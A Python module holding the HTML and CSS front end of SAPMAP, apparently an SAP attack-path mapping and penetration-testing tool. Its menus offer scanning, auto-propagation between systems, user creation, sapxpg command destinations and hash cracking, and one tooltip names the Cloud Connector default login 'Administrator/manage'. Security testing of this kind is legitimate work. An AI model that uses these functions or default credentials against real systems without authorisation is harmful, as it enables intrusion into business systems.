#!/usr/bin/env python3
"""
SAPMAP HTML Frontend — Single-page app with interactive SVG landscape map.

Generates the complete HTML/CSS/JavaScript for the SAPMAP GUI.
Features:
  - Interactive SVG map with pan/zoom/drag
  - System boxes with SAPology pill icons
  - RFC connection lines with hover info
  - Right-click context menus
  - Connection info panels
  - Credential dialogs
  - Real-time console
  - Status bar
"""


def get_html() -> str:
    """Return the complete HTML for the SAPMAP single-page application."""
    return _HTML


_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SAPMAP — SAP Landscape Attack Path Mapper</title>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<style>
/* === Reset & Base === */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }
body {
  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
  background: #0d1117; color: #e6edf3; font-size: 13px;
  display: flex; flex-direction: column;
}

/* === Menu Bar === */
.menu-bar {
  display: flex; align-items: center; gap: 2px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 2px 8px; height: 28px; flex-shrink: 0;
}
.menu-bar .logo { font-weight: 700; color: #f0883e; margin-right: 12px; font-size: 13px; }
.menu-item {
  position: relative; padding: 3px 10px; cursor: pointer;
  border-radius: 4px; color: #c9d1d9; font-size: 12px;
}
.menu-item:hover { background: #30363d; }
.menu-dropdown {
  display: none; position: absolute; left: 0; top: 100%;
  background: #1c2128; border: 1px solid #30363d; border-radius: 6px;
  min-width: 220px; padding: 4px 0; z-index: 1000; box-shadow: 0 8px 24px rgba(0,0,0,.4);
}
.menu-item:hover .menu-dropdown { display: block; }
.menu-dropdown .dd-item {
  padding: 6px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px;
  font-size: 12px; color: #c9d1d9;
}
.menu-dropdown .dd-item:hover { background: #30363d; }
.menu-dropdown .dd-sep { border-top: 1px solid #30363d; margin: 4px 0; }

/* === Toolbar === */
.toolbar {
  display: flex; align-items: center; gap: 6px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 6px 12px; flex-shrink: 0;
}
.toolbar label { color: #8b949e; font-size: 11px; }
.toolbar input, .toolbar select {
  background: #0d1117; border: 1px solid #30363d; color: #e6edf3;
  padding: 3px 8px; border-radius: 4px; font-size: 12px;
}
.toolbar input[type="text"] { width: 260px; }
.toolbar input[type="number"] { width: 50px; }
.btn {
  padding: 4px 12px; border: 1px solid #30363d; border-radius: 4px;
  background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 12px;
  display: inline-flex; align-items: center; gap: 4px;
}
.btn:hover { background: #30363d; border-color: #8b949e; }
.btn-primary { background: #238636; border-color: #2ea043; color: #fff; }
.btn-primary:hover { background: #2ea043; }
.btn-danger { background: #da3633; border-color: #f85149; color: #fff; }
.btn-danger:hover { background: #f85149; }
.radio-group { display: flex; gap: 12px; align-items: center; }
.radio-group label { display: flex; align-items: center; gap: 4px; cursor: pointer; }

/* === Main Layout === */
.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
.map-container {
  flex: 1; position: relative; overflow: hidden;
  background: #0d1117; border-bottom: 1px solid #30363d;
}
.map-container .empty-msg {
  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
  color: #484f58; font-size: 14px; text-align: center;
}

/* === SVG Map === */
#map-svg { width: 100%; height: 100%; }
.node-box { cursor: grab; }
.node-box:active { cursor: grabbing; }
.node-header { cursor: grab; }
.edge-line { cursor: pointer; }
.edge-line:hover { stroke-width: 8 !important; filter: brightness(1.3); }

/* === Legend === */
.legend-bar {
  display: flex; align-items: center; gap: 16px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 3px 12px; font-size: 11px; color: #8b949e; flex-shrink: 0;
}
.legend-item { display: flex; align-items: center; gap: 4px; }
.legend-swatch {
  width: 14px; height: 10px; border-radius: 2px; display: inline-block;
}

/* === Console === */
.console-resizer {
  height: 8px; flex-shrink: 0; cursor: ns-resize;
  background: #21262d; border-top: 1px solid #30363d; border-bottom: 1px solid #30363d;
  transition: background 0.15s;
  position: relative; z-index: 10;
  display: flex; align-items: center; justify-content: center;
}
.console-resizer::before {
  content: ''; display: block;
  width: 40px; height: 2px; border-radius: 2px;
  background: #484f58;
}
.console-resizer:hover, .console-resizer.dragging { background: #1f6feb; }
.console-resizer:hover::before, .console-resizer.dragging::before { background: #c9d1d9; }
.console-container {
  height: 180px; flex-shrink: 0; display: flex; flex-direction: column;
  min-height: 0;
}
.console-header {
  display: flex; justify-content: space-between; align-items: center;
  background: #161b22; padding: 2px 12px; font-size: 11px; color: #8b949e;
  border-bottom: 1px solid #30363d;
}
.console-body {
  flex: 1; overflow-y: auto; padding: 4px 12px;
  font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
  font-size: 11px; background: #0d1117; line-height: 1.5;
  user-select: text; -webkit-user-select: text; cursor: text;
}
.cl-ok { color: #3fb950; }
.cl-err { color: #f85149; }
.cl-warn { color: #d29922; }
.cl-info { color: #8b949e; }
.cl-dim { color: #484f58; }
.cl-crit { color: #f85149; font-weight: bold; }

/* === Status Bar === */
.status-bar {
  display: flex; align-items: center; gap: 16px;
  background: #161b22; border-top: 1px solid #30363d;
  padding: 2px 12px; font-size: 11px; color: #8b949e; flex-shrink: 0;
}
.status-bar .stat { display: flex; align-items: center; gap: 4px; }
.status-bar .stat-val { color: #e6edf3; font-weight: 600; }

/* === Context Menu === */
.ctx-menu {
  display: none; position: fixed; z-index: 2000;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  min-width: 260px; padding: 4px 0; box-shadow: 0 8px 24px rgba(0,0,0,.5);
}
.ctx-menu.visible { display: block; }
.ctx-item {
  padding: 7px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px;
  font-size: 12px; color: #c9d1d9; position: relative; white-space: nowrap;
}
.ctx-item:hover { background: #30363d; }
.ctx-item.disabled { color: #484f58; cursor: default; }
.ctx-item.disabled:hover { background: transparent; }
.ctx-sep { border-top: 1px solid #30363d; margin: 4px 0; }

/* Flyout submenu groups */
.ctx-group { position: relative; }
.ctx-group > .ctx-item::after {
  content: '\25B8'; margin-left: auto; font-size: 10px; color: #8b949e;
}
.ctx-sub {
  display: none; position: absolute; left: 100%; top: -4px;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  min-width: 260px; padding: 4px 0; box-shadow: 0 8px 24px rgba(0,0,0,.5);
  z-index: 2100;
}
.ctx-group:hover > .ctx-sub { display: block; }
/* Flip submenu left if it would overflow viewport (set by JS) */
.ctx-sub.flip-left { left: auto; right: 100%; }

/* === Info Panel (connection details) === */
.info-panel {
  display: none; position: fixed; z-index: 1500;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  width: 420px; max-height: 500px; overflow-y: auto; padding: 16px;
  box-shadow: 0 8px 24px rgba(0,0,0,.5);
  /* Everything inside the panel is selectable so the operator can
     copy IPs, usernames, passwords, etc. */
  user-select: text; -webkit-user-select: text; cursor: text;
}
.info-panel.visible { display: block; }
.info-panel h3 { font-size: 13px; color: #f0883e; margin-bottom: 10px; }
.info-panel .info-row { display: flex; margin: 3px 0; font-size: 12px; }
.info-panel .info-label { color: #8b949e; width: 110px; flex-shrink: 0; }
.info-panel .info-val { color: #e6edf3; word-break: break-all; }
.info-panel .info-section { margin-top: 8px; padding-top: 8px; border-top: 1px solid #30363d; }
.info-panel .profile-list { margin: 4px 0 0 8px; }
.info-panel .profile-item { font-size: 11px; color: #c9d1d9; padding: 1px 0; }
.info-panel .profile-item.sap-all { color: #f85149; font-weight: bold; }
.info-panel .risk-badge {
  display: inline-block; padding: 2px 8px; border-radius: 3px;
  font-size: 11px; font-weight: 600;
}
.risk-critical { background: #da3633; color: #fff; }
.risk-high { background: #e67e22; color: #fff; }
.risk-medium { background: #d29922; color: #fff; }
.risk-low { background: #3498db; color: #fff; }
.risk-unknown { background: #484f58; color: #fff; }

/* === Modal === */
.modal-overlay {
  display: none; position: fixed; inset: 0; z-index: 3000;
  background: rgba(0,0,0,.6); align-items: center; justify-content: center;
}
.modal-overlay.visible { display: flex; }
.modal {
  background: #1c2128; border: 1px solid #30363d; border-radius: 10px;
  width: 440px; padding: 20px; box-shadow: 0 12px 40px rgba(0,0,0,.5);
  /* Scroll when content overflows viewport (e.g. BTP enumerate result
     panel can grow several thousand pixels on landscapes with many
     CF service instances). */
  max-height: 90vh; overflow-y: auto;
  /* Slim scrollbar so the modal still looks tidy when scrolling. */
  scrollbar-width: thin; scrollbar-color: #484f58 #1c2128;
}
.modal::-webkit-scrollbar { width: 8px; }
.modal::-webkit-scrollbar-track { background: #1c2128; }
.modal::-webkit-scrollbar-thumb { background: #484f58; border-radius: 4px; }
.modal h3 { font-size: 14px; color: #f0883e; margin-bottom: 16px; }
.modal .form-row { margin-bottom: 10px; }
.modal .form-row label { display: block; font-size: 11px; color: #8b949e; margin-bottom: 3px; }
.modal .form-row input, .modal .form-row select {
  width: 100%; padding: 6px 10px; background: #0d1117; border: 1px solid #30363d;
  color: #e6edf3; border-radius: 4px; font-size: 12px;
  -webkit-appearance: none; appearance: none;
}
.modal .form-row select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%238b949e' d='M2 4l4 4 4-4'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 8px center; padding-right: 28px; }
.modal .form-row select option { background: #0d1117; color: #e6edf3; }
.modal .form-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }

/* === Pill Badges (system type) === */
.pill {
  display: inline-block; padding: 1px 8px; border-radius: 10px;
  font-size: 9px; font-weight: 700; color: #fff; vertical-align: middle;
}

/* === System Detail Panel === */
.detail-panel {
  display: none; position: fixed; right: 0; top: 28px; bottom: 24px;
  width: 360px; background: #1c2128; border-left: 1px solid #30363d;
  z-index: 1000; overflow-y: auto; padding: 16px;
  user-select: text; -webkit-user-select: text; cursor: auto;
}
.detail-panel.visible { display: block; }
.detail-panel h3 { font-size: 14px; color: #f0883e; margin-bottom: 12px; }
.detail-panel .close-btn {
  position: absolute; top: 8px; right: 12px; cursor: pointer;
  color: #8b949e; font-size: 16px;
}
.detail-panel .close-btn:hover { color: #e6edf3; }
.detail-section { margin-bottom: 12px; }
.detail-section h4 { font-size: 12px; color: #8b949e; margin-bottom: 6px; }
.detail-row { display: flex; font-size: 12px; padding: 2px 0; }
.detail-key { color: #8b949e; width: 100px; flex-shrink: 0; }
.detail-val { color: #e6edf3; word-break: break-all; }
.finding-item {
  padding: 4px 8px; margin: 2px 0; border-radius: 4px;
  font-size: 11px; border-left: 3px solid;
}
.finding-critical { border-color: #da3633; background: rgba(218,54,51,.1); }
.finding-high { border-color: #e67e22; background: rgba(230,126,34,.1); }
.finding-medium { border-color: #d29922; background: rgba(210,153,34,.1); }
.finding-low { border-color: #3498db; background: rgba(52,152,219,.1); }
.finding-info { border-color: #8b949e; background: rgba(139,148,158,.1); }

/* Activity indicator */
@keyframes spin { to { transform: rotate(360deg); } }
@keyframes pulse { 0%,100% { opacity:.6; } 50% { opacity:1; } }
@keyframes activity-glow {
  0%,100% { box-shadow: inset 0 0 0 1px #f0883e70, 0 0 14px #f0883e40; }
  50%     { box-shadow: inset 0 0 0 1px #f0883e, 0 0 22px #f0883e90; }
}
.activity-dot {
  display: inline-block; width: 12px; height: 12px; border-radius: 50%;
  background: #f0883e; margin-right: 10px;
  animation: pulse 1.2s ease-in-out infinite;
  box-shadow: 0 0 8px #f0883ecc;
}
#activity-bar {
  display: none; align-items: center; gap: 6px;
  background: linear-gradient(90deg, #2a1a08 0%, #1a1510 100%);
  border-bottom: 2px solid #f0883e;
  padding: 8px 16px; flex-shrink: 0;
  font-size: 15px; font-weight: 600; letter-spacing: 0.3px;
  color: #ffb27a; text-shadow: 0 0 6px #f0883e80;
  animation: activity-glow 2s ease-in-out infinite;
}
#activity-bar.active { display: flex; }
#activity-prefix {
  font-weight: 700; color: #f0883e; margin-right: 8px;
  text-transform: uppercase; font-size: 12px; letter-spacing: 1px;
  padding: 2px 8px; border: 1px solid #f0883e80; border-radius: 3px;
  background: #f0883e15;
}
/* Critical-finding banner: fixed bottom-right toast stack so it doesn't
 * pile up with the activity-bar at the top.  Newest slides in from the
 * right and sits at the bottom; older toasts stack upward. */
#findings-bar {
  position: fixed; right: 16px; z-index: 900;
  bottom: 200px; /* JS updates this to sit just above the console pane */
  width: 420px; max-width: calc(100vw - 32px);
  display: flex; flex-direction: column; gap: 8px;
  pointer-events: none;
  transition: bottom 0.12s ease-out;
}
.finding-row {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px; font-size: 13px; font-weight: 600;
  border-radius: 6px; border-left: 4px solid currentColor;
  box-shadow: 0 4px 18px #000a, 0 0 0 1px #30363d80;
  backdrop-filter: blur(2px);
  pointer-events: auto;
  animation: finding-slide 0.28s ease-out;
}
@keyframes finding-slide {
  from { transform: translateX(24px); opacity: 0; }
  to   { transform: translateX(0);    opacity: 1; }
}
.finding-row.sev-CRITICAL {
  background: linear-gradient(90deg, #4a1a1a 0%, #2a1010 100%);
  color: #ff8a80;
  border-bottom-color: #8b0000;
  box-shadow: inset 0 0 0 1px #8b000080, 0 0 16px #8b000050;
}
.finding-row.sev-HIGH {
  background: linear-gradient(90deg, #3a2410 0%, #1f1810 100%);
  color: #ffb27a;
  border-bottom-color: #f0883e;
  box-shadow: inset 0 0 0 1px #f0883e60;
}
.finding-row.sev-MEDIUM {
  background: linear-gradient(90deg, #3a3410 0%, #1f1c10 100%);
  color: #e6d884;
  border-bottom-color: #d29922;
}
.finding-row.sev-INFO {
  background: linear-gradient(90deg, #10283a 0%, #101820 100%);
  color: #8bd2ff;
  border-bottom-color: #388bfd;
}
.finding-sev {
  font-weight: 800; font-size: 10px; letter-spacing: 1px;
  padding: 2px 7px; border: 1px solid currentColor; border-radius: 3px;
  flex-shrink: 0; text-transform: uppercase;
}
.finding-node {
  font-weight: 700; cursor: pointer; text-decoration: underline;
  text-decoration-color: currentColor; text-underline-offset: 3px;
  flex-shrink: 0;
}
.finding-node:hover { filter: brightness(1.3); }
.finding-msg { flex: 1; font-weight: 500; }
.finding-cve {
  flex-shrink: 0; font-size: 11px; opacity: 0.8;
  padding: 1px 6px; border: 1px solid currentColor; border-radius: 2px;
}
.finding-dismiss {
  cursor: pointer; opacity: 0.6; padding: 2px 6px;
  font-size: 14px; user-select: none;
}
.finding-dismiss:hover { opacity: 1; }
.finding-more {
  text-align: center; padding: 4px 10px; font-size: 11px; cursor: pointer;
  background: #161b22d0; color: #8b949e;
  border-radius: 4px; border: 1px solid #30363d;
  pointer-events: auto;
}
.finding-more:hover { color: #c9d1d9; border-color: #484f58; }
/* Bell icon in toolbar with new-finding badge */
#findings-bell {
  position: relative; cursor: pointer; user-select: none;
  padding: 4px 8px; font-size: 15px; color: #c9d1d9;
  border: 1px solid #30363d; border-radius: 4px; background: #161b22;
}
#findings-bell:hover { background: #21262d; }
#findings-bell.has-critical { color: #ff8a80; border-color: #8b0000;
                               box-shadow: 0 0 10px #8b000080; }
#findings-bell.has-high     { color: #ffb27a; border-color: #f0883e; }
#findings-badge {
  position: absolute; top: -6px; right: -6px;
  min-width: 16px; height: 16px; line-height: 16px; padding: 0 4px;
  font-size: 10px; font-weight: 700; text-align: center;
  background: #8b0000; color: #fff; border-radius: 8px;
  display: none;
}
#findings-badge.show { display: inline-block; }
/* Session drawer: full chronological log opened from the bell */
#findings-drawer {
  position: fixed; top: 0; right: 0; width: 420px; height: 100%;
  background: #0d1117; border-left: 1px solid #30363d; z-index: 9999;
  display: none; flex-direction: column;
  box-shadow: -6px 0 24px #0008;
}
#findings-drawer.open { display: flex; }
#findings-drawer-head {
  padding: 10px 14px; border-bottom: 1px solid #30363d;
  display: flex; align-items: center; justify-content: space-between;
  background: #161b22;
}
#findings-drawer-head h3 {
  font-size: 13px; color: #c9d1d9; margin: 0; font-weight: 600;
  letter-spacing: 0.5px;
}
#findings-drawer-body {
  flex: 1; overflow: auto; padding: 8px;
}
#findings-drawer-filters {
  display: flex; align-items: center; gap: 10px;
  padding: 6px 12px; background: #0b0f14;
  border-bottom: 1px solid #30363d;
  font-size: 11px; color: #8b949e;
}
#findings-drawer-filters label {
  display: flex; align-items: center; gap: 4px; cursor: pointer;
}
.findings-tool {
  cursor: pointer; color: #8b949e; padding: 2px 6px;
  font-size: 14px; margin-right: 6px;
}
.findings-tool:hover { color: #c9d1d9; }
.finding-log-row {
  display: block; padding: 6px 10px; margin-bottom: 4px;
  border-left: 3px solid currentColor; border-radius: 2px;
  background: #161b22;
  font-size: 12px; line-height: 1.4;
}
.finding-log-row.sev-CRITICAL { color: #ff8a80; }
.finding-log-row.sev-HIGH     { color: #ffb27a; }
.finding-log-row.sev-MEDIUM   { color: #e6d884; }
.finding-log-row.sev-INFO     { color: #8bd2ff; }
/* Drawer-specific overrides: the banner styles use big outlined
   badges that wrap awkwardly inside the narrow (420px) drawer.  In
   the drawer we want a compact header line and a free-flowing
   message paragraph. */
.finding-log-row .finding-sev {
  font-weight: 700; font-size: 9px; letter-spacing: 0.6px;
  padding: 1px 5px; border-radius: 2px; border: none;
  background: currentColor; color: #0d1117;
  margin-right: 6px; display: inline-block; vertical-align: 1px;
}
.finding-log-row .finding-node {
  font-weight: 700; cursor: pointer;
  text-decoration: underline; text-underline-offset: 2px;
  margin-right: 6px;
}
.finding-log-row .finding-msg {
  display: block; margin-top: 3px;
  color: #c9d1d9; font-weight: 400;
  word-break: break-word;
}
.finding-log-row .finding-cve {
  display: inline-block; margin-left: 4px;
  font-size: 10px; padding: 0 4px; border-radius: 2px;
  border: 1px solid currentColor; opacity: 0.75;
  vertical-align: 1px;
}
.shell-window {
  position: fixed; width: 820px; height: 520px;
  min-width: 400px; min-height: 300px; padding: 0;
  display: flex; flex-direction: column; overflow: hidden;
  top: 50%; left: 50%; transform: translate(-50%, -50%);
}
.shell-titlebar {
  cursor: move; padding: 8px 12px; background: #161b22;
  border-bottom: 1px solid #30363d; flex-shrink: 0;
  user-select: none; -webkit-user-select: none;
}
.shell-titlebar h3 { font-size: 14px; color: #f0883e; }
.shell-resize-handle {
  position: absolute; bottom: 0; right: 0; width: 16px; height: 16px;
  cursor: nwse-resize; z-index: 10;
  background: linear-gradient(135deg, transparent 50%, #484f58 50%, transparent 60%,
    #484f58 70%, transparent 80%, #484f58 90%);
}
</style>
</head>
<body>

<!-- Menu Bar -->
<div class="menu-bar">
  <span class="logo">&#9889; SAPMAP</span>
  <div class="menu-item">File
    <div class="menu-dropdown">
      <div class="dd-item" onclick="loadState()">&#128194; Load State...</div>
      <div class="dd-item" onclick="saveState()">&#128190; Save State...</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="exportJSON()">&#128196; Export JSON</div>
      <div class="dd-item" onclick="exportReport()">&#128221; Export Engagement Report (HTML + Markdown)</div>
      <div class="dd-item" onclick="openDiffModal()">&#128202; Diff Two Runs (compare snapshots)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="if(confirm('Exit SAPMAP?'))api('POST','exit').then(()=>window.close())">&#10060; Exit</div>
    </div>
  </div>
  <div class="menu-item">Scan
    <div class="menu-dropdown">
      <div class="dd-item" onclick="toggleToolbar()">&#128295; Toggle Scan Panel</div>
    </div>
  </div>
  <div class="menu-item">Actions
    <div class="menu-dropdown">
      <div class="dd-item" onclick="scanAllVulns()" style="color:#f0883e">&#128270; Scan for All Vulnerabilities</div>
      <div class="dd-item" onclick="propagateAll()">&#128640; Auto-Propagate All</div>
      <div class="dd-item" onclick="testAllRFCs()">&#129514; Test All RFC Destinations</div>
      <div class="dd-item" onclick="cleanupAll()">&#129529; Cleanup All Users</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="showCreatedUsers()">&#128203; View Created Users</div>
      <div class="dd-item" onclick="showCreatedDestinations()">&#128203; View Created TCP/IP Destinations</div>
      <div class="dd-item" onclick="clearCreatedDestinations()">&#128465; Clear TCP/IP Destinations List</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="showAddSystemModal()">&#10133; Add System Manually</div>
      <div class="dd-item" onclick="showSetPasswordModal()">&#128273; Set Default Password</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="showHashesApiKeyModal()">&#128273; Set hashes.com API Key</div>
      <div class="dd-item" onclick="showBtpTokenModal()">&#9729;&#65039; BTP — Paste cf oauth-token</div>
    </div>
  </div>
  <div class="menu-item">View
    <div class="menu-dropdown">
      <div class="dd-item" onclick="zoomIn()">&#128269; Zoom In</div>
      <div class="dd-item" onclick="zoomOut()">&#128269; Zoom Out</div>
      <div class="dd-item" onclick="fitMap()">&#128208; Fit to Window</div>
      <div class="dd-item" onclick="resetLayout()">&#128260; Reset Layout (Grid)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="layoutCircle()">&#9711; Layout: Circle</div>
      <div class="dd-item" onclick="layoutStar()">&#10024; Layout: Star (hub &amp; spoke)</div>
      <div class="dd-item" onclick="layoutHierarchy()">&#128719; Layout: Hierarchy (top &rarr; bottom by RFC)</div>
      <div class="dd-item" onclick="layoutByStack()">&#128218; Layout: Group by Stack (ABAP / Java / Dual)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="toggleConsole()">&#128203; Toggle Console</div>
    </div>
  </div>
  <div class="menu-item">Help
    <div class="menu-dropdown">
      <div class="dd-item" onclick="showAbout()">&#8505;&#65039; About &amp; Disclaimer</div>
    </div>
  </div>
</div>

<!-- Toolbar (Scan Configuration) -->
<div class="toolbar" id="toolbar" style="flex-wrap:wrap;gap:4px 8px">
  <label>Targets:</label>
  <input type="text" id="targets" placeholder="192.168.1.0/24 or @targets.txt" value="" onkeydown="if(event.key==='Enter')startScan()">
  <label>Inst:</label>
  <input type="number" id="inst-from" value="0" min="0" max="99">
  <span style="color:#484f58">-</span>
  <input type="number" id="inst-to" value="99" min="0" max="99">
  <label>Threads:</label>
  <input type="number" id="threads" value="30" min="1" max="200" title="Threads per host for port scanning">
  <label>Timeout:</label>
  <input type="number" id="timeout" value="3" min="1" max="30" step="0.5" style="width:45px" title="Socket timeout (seconds)">
  <div class="radio-group">
    <label><input type="radio" name="scanmode" value="fast" checked> Fast</label>
    <label><input type="radio" name="scanmode" value="deep"> Deep</label>
  </div>
  <button class="btn" onclick="toggleAdvanced()" style="font-size:10px;padding:2px 8px" title="Show advanced scan settings">&#9881; Adv</button>
  <button class="btn btn-primary" onclick="startScan()">&#9654; Scan</button>
  <button class="btn btn-danger" onclick="stopScan()">&#9724; Stop</button>
  <span style="flex:1"></span>
  <button class="btn" onclick="loadState()">&#128194; Load</button>
  <button class="btn" onclick="saveState()">&#128190; Save</button>
</div>
<!-- Advanced scan settings (hidden by default) -->
<div class="toolbar" id="toolbar-adv" style="display:none;padding:4px 12px;gap:4px 12px;flex-wrap:wrap;background:#12161d;border-bottom:1px solid #30363d">
  <span style="color:#8b949e;font-size:11px;font-weight:600">Advanced:</span>
  <label>Concurrent Hosts:</label>
  <input type="number" id="adv-concurrent" value="5" min="1" max="20" style="width:45px" title="Max hosts to port-scan in parallel (higher=faster but may miss ports)">
  <label>Port Timeout:</label>
  <input type="number" id="adv-port-timeout" value="2.0" min="0.5" max="10" step="0.5" style="width:50px" title="TCP connect timeout for port probes (seconds). Lower=faster but may miss slow ports">
  <label>Alive Timeout:</label>
  <input type="number" id="adv-alive-timeout" value="0.5" min="0.2" max="5" step="0.1" style="width:50px" title="Timeout for host alive detection (seconds)">
  <label style="cursor:pointer"><input type="checkbox" id="adv-skip-alive" style="margin-right:3px">Skip Alive Sweep</label>
  <label style="cursor:pointer" title="Send ONE login POST per Cloud Connector found (Administrator/manage). Off by default — leaves a failed-login audit entry on the SCC."><input type="checkbox" id="adv-scc-probe-creds" style="margin-right:3px">SCC: Probe Default Creds</label>
</div>

<!-- Activity Bar -->
<div id="activity-bar"><span class="activity-dot"></span><span id="activity-prefix">Working</span><span id="activity-text">...</span></div>

<!-- Critical-finding banner (rendered by renderFindings()) -->
<div id="findings-bar"></div>

<!-- Session drawer for the full findings log (opens from the bell) -->
<div id="findings-drawer">
  <div id="findings-drawer-head">
    <h3>&#128276; Session Findings</h3>
    <span style="flex:1"></span>
    <span class="findings-tool" onclick="copyFindingsMarkdown()"
          title="Copy all findings as markdown">&#128203;</span>
    <span style="cursor:pointer;color:#8b949e;font-size:16px"
          onclick="toggleFindingsDrawer()" title="Close">&times;</span>
  </div>
  <div id="findings-drawer-filters">
    <label><input type="checkbox" id="fflt-crit" checked
             onchange="renderFindings()"> CRITICAL</label>
    <label><input type="checkbox" id="fflt-high" checked
             onchange="renderFindings()"> HIGH</label>
    <label><input type="checkbox" id="fflt-med"  checked
             onchange="renderFindings()"> MEDIUM</label>
    <label><input type="checkbox" id="fflt-info" checked
             onchange="renderFindings()"> INFO</label>
    <span style="flex:1"></span>
    <input type="text" id="fflt-node" placeholder="Filter by SID/host"
           oninput="renderFindings()"
           style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;
                  padding:2px 6px;font-size:11px;border-radius:3px;width:100px">
  </div>
  <div id="findings-drawer-body"><div style="color:#6e7681;padding:20px;text-align:center">No findings yet</div></div>
</div>

<!-- Main Area -->
<div class="main">
  <!-- Map -->
  <div class="map-container" id="map-container">
    <div class="empty-msg" id="empty-msg">Start a scan or load a saved state to discover SAP systems</div>
    <svg id="map-svg" xmlns="http://www.w3.org/2000/svg"></svg>
    <!-- Pulse overlay: short-lived SVG rects/lines flashed when a finding
         fires.  Lives outside #map-svg so innerHTML rebuilds don't wipe
         in-flight animations.  viewBox is kept in sync by applyViewBox(). -->
    <svg id="pulse-svg" xmlns="http://www.w3.org/2000/svg"
         style="position:absolute;inset:0;width:100%;height:100%;
                pointer-events:none;z-index:5"></svg>
  </div>

  <!-- Legend -->
  <div class="legend-bar" id="legend-bar" style="display:none">
    <span style="color:#8b949e">LEGEND:</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#4a1a1a;border:1px solid #8b0000"></span> PRD</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#4a3a1a;border:1px solid #e67e22"></span> Non-PRD</span>
    <span class="legend-item"><span class="legend-swatch" style="background:transparent;border:2px solid #8b0000"></span> Critical</span>
    <span class="legend-item">&#9889; Pwned</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#e74c3c"></span> RFC Logon OK + SAP_ALL</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#2ecc71"></span> RFC Logon OK</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#5dade2"></span> RFC (untested)</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#a371f7;border:2px dotted #a371f7;background:transparent"></span> HTTP destination</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#ff6b35;border:2px dashed #ff6b35;background:transparent"></span> TCP/IP (sapxpg)</span>
    <span class="legend-item"><span class="legend-swatch" style="background:#046c7a"></span> SAP Cloud Connector</span>
    <span style="flex:1"></span>
    <label style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:2px 10px;border:1px solid #30363d;border-radius:4px;background:#161b22;color:#c9d1d9;font-size:11px"><input type="checkbox" id="show-unknown" style="accent-color:#f0883e;width:14px;height:14px" onchange="updateMap()"> Show unknown targets</label>
  </div>

  <!-- Console restore button (visible when console is minimized) -->
  <div id="console-restore" style="display:none;height:24px;flex-shrink:0;background:#161b22;border-top:1px solid #30363d;cursor:pointer;text-align:right;padding-right:12px;line-height:24px;color:#8b949e;font-size:12px;user-select:none" onclick="toggleConsole()" title="Show Console">&#9650; Console</div>

  <!-- Drag handle to resize console -->
  <div class="console-resizer" id="console-resizer" title="Drag to resize console"></div>

  <!-- Console -->
  <div class="console-container" id="console-container">
    <div class="console-header">
      <span>Console</span>
      <span style="flex:1"></span>
      <span id="console-status" style="margin-right:12px">Ready</span>
      <span style="cursor:pointer;font-size:13px;color:#8b949e;padding:0 4px" onclick="toggleConsole()" title="Minimize console">&#9660;</span>
      <span style="cursor:pointer;font-size:13px;color:#8b949e;padding:0 4px" onclick="maximizeConsole()" title="Maximize / Restore console">&#9633;</span>
    </div>
    <div class="console-body" id="console-body">
      <div class="cl-info">[Ready] Waiting for scan...</div>
    </div>
  </div>
</div>

<!-- Status Bar -->
<div class="status-bar">
  <span class="stat">Status: <span class="stat-val" id="st-status">Idle</span></span>
  <span class="stat">Systems: <span class="stat-val" id="st-systems">0</span></span>
  <span class="stat">Connections: <span class="stat-val" id="st-connections">0</span></span>
  <span class="stat">Pwned: <span class="stat-val" id="st-pwned">0</span></span>
  <span class="stat">Users Created: <span class="stat-val" id="st-users">0</span></span>
  <span style="flex:1"></span>
  <span id="findings-bell" onclick="toggleFindingsDrawer()"
        title="Session findings (click to open)">&#128276;<span id="findings-badge">0</span></span>
</div>

<!-- Context Menu (items enabled/disabled dynamically by showCtxMenu) -->
<div class="ctx-menu" id="ctx-menu">
  <!-- Top-level quick actions -->
  <div class="ctx-item" data-action="details">&#128269; View System Details</div>
  <div class="ctx-item" data-action="findings">&#128203; View SAPology Findings</div>
  <div class="ctx-item" data-action="credentials">&#128273; Provide Credentials</div>
  <div class="ctx-sep"></div>
  <!-- Scanning submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128225; Scanning</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="standard_scan">&#128270; Standard Scan (fingerprint host)</div>
      <div class="ctx-item" data-action="analyse_capabilities">&#128201; Analyse User Capabilities</div>
      <div class="ctx-item" data-action="rfc_system_info">&#128225; RFC System Info</div>
